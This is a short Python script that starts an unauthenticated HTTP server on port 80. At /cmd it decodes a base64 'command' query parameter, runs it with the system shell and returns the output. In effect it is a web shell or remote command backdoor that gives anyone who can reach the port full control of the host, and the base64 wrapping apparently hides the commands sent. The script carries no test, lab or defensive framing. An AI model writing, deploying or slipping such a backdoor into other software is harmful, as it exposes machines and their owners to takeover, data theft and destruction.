from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import subprocess
import base64

def cmd(command):
    try:
        command = base64.b64decode(command).decode('utf-8')
        
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
       
        return result

    except subprocess.CalledProcessError as e:
        return f"Erreur lors de l'exécution de la command : {e.output}"


class CustomHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)

        if parsed_url.path == '/cmd' and "command" in query_params:
            command = query_params['command'][0]
        
            result = cmd(command)
        
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(bytes(str(result), 'utf-8'))
        else:
            self.send_response(404)
            self.end_headers()


def run_server(port=80):
    server_address = ('', port)
    httpd = HTTPServer(server_address, CustomHandler)
    print(f'Server started on port {port}')
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()